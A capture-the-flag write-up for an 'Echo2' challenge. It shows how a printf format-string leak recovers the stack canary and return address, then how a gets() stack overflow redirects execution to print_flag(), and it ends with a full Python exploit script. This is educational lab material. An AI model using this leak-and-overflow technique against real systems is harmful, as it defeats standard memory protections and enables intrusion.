# Echo2

## Description
I fixed my echo server by enabling lots of protections. Now what can you do?

## Solution
The challenge is to force the echo server to echo back the flag. There is a trivial stack overflow again, but ASLR and
stack canaries have been enabled. Another `print_flag()` function exists, which is the target (or full shell, whatever).

This time around we have a `printf()` call instead of `puts()`. This allows us to inject format strings to leak stack
data. It's an x86_64 machine, which means arguments to a function are a combination of registers, then stack. We can
read off the stack by providing repeated `%p`'s.

The `do_echo()` call is in a loop, which means we will have the ability to leack the stack and get the secret canary
values and ASLR'd location information we need to exploit it.

### Step 1: The Leak
We provide 64 + 5 `%p`'s to leak out 512 bytes of the stack (the first 5 are just additional stack arguments to printf).

Reading back the result in python and parsing, we can see:
```
...
 {34: b'0'},
 {35: b'0'},
 {36: b'0'},
 {37: b'0'},
 {38: b'dc6cea00babd5d00'},
 {39: b'0'},
 {40: b'55c4772f25b5'},
...
```

...a stack canary, null word, and then a return address into `main()` just past the `do_echo()` call site. If we repeat
this input in a single connection, the values are stable. If we disconnect and reconnect, we can observe the randomness
at work.

We can match up the address with:
```
00000000000015a1 <main>:
    15a1: f3 0f 1e fa                  	endbr64
    15a5: 50                           	pushq	%rax
    15a6: 58                           	popq	%rax
    15a7: 48 83 ec 08                  	subq	$0x8, %rsp
    15ab: b8 00 00 00 00               	movl	$0x0, %eax
    15b0: e8 39 fe ff ff               	callq	0x13ee <do_echo>
    15b5: eb f4                        	jmp	0x15ab <main+0xa>
```

And the target:
```
0000000000001229 <print_flag>:
    1229: f3 0f 1e fa                  	endbr64
    122d: 55                           	pushq	%rbp
...
```

With this info, we can to reproduce the correct canary and reuse part of the return address for the injected stack.

### Step 2: The Exploit
Using the information from above, we can construct a payload. Note that `gets()` looks for newlines, and will accept
null bytes. This is important information and useful behavior since the LSB of the canary is a null value (on purpose).
We must however be wary of newline 0x0a characters randomly appearing in the canary or random address. We can either
code a loop, or just manually try it a few times until it works.

Python solver:
```
import socket
import pprint
import sys

REG_ARGS = 6 - 1 # 6 regs used for calling args (minus the format string arg to printf)
LEAKY_STRING = b"%p" * (64 + REG_ARGS)  # 64 * 8 = 512 bytes of stack to read

ORIG_RET_ADDRESS = 0x15b5
TARGET_ADDRESS = 0x1229

CANARY_OFFSET = 33
RET_OFFSET = 35


def hack_the_planet(host: str, port: int):
    """Solve the echo2 challenge."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(1)

    # Step 1: Leak
    s.send(LEAKY_STRING + b"\n")
    data = s.recv(4096)

    # Convert (nil) to 0x0
    data = data.replace(b"(nil)", b"0x0")
    values = data.split(b"0x")[1 + REG_ARGS:] # First is empty

    # Print out the read stack for debugging
    pprint.pprint([{num: value} for num, value in enumerate(values)], width=32)

    canary = int(values[CANARY_OFFSET].decode(), 16)
    ret = int(values[RET_OFFSET].decode(), 16)

    ret -= ORIG_RET_ADDRESS
    ret += TARGET_ADDRESS

    canary_bin = int.to_bytes(canary, 8, "little", signed=False)
    ret_bin = int.to_bytes(ret, 8, "little", signed=False)

    data = b"a" * (8 * CANARY_OFFSET)
    data += canary_bin
    data += b"\x00" * 8
    data += ret_bin

    # Step 2: Exploit
    s.send(data + b"\n")

    # Recieve multiple chunks
    result = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        result += chunk

    # Find the flag
    offset = result.find(b"flag{")
    return result[offset:]


if __name__ == "__main__":
    print(hack_the_planet(sys.argv[1], int(sys.argv[2])))
```
